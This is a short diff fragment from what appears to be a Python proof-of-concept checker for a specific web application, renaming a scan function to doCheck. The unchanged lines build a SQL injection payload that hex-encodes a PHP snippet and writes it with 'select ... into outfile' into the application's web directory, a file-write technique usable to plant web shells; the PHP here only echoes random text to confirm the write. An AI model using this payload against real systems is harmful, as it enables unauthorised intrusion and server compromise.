@@ -19,7 +19,7 @@ filename=randomLowercase(8)
 content=randomLowercase(10)
 phpcontent=f'<?php echo "{content}";?>'
 payload=f"select {Hex_encoding(phpcontent)} into outfile '/usr/hddocs/nsg/app/{filename}.php'"
-def scan(baseurl):
+def doCheck(baseurl):
 	if baseurl[-1]=="/":
 		baseurl=baseurl
 	else:
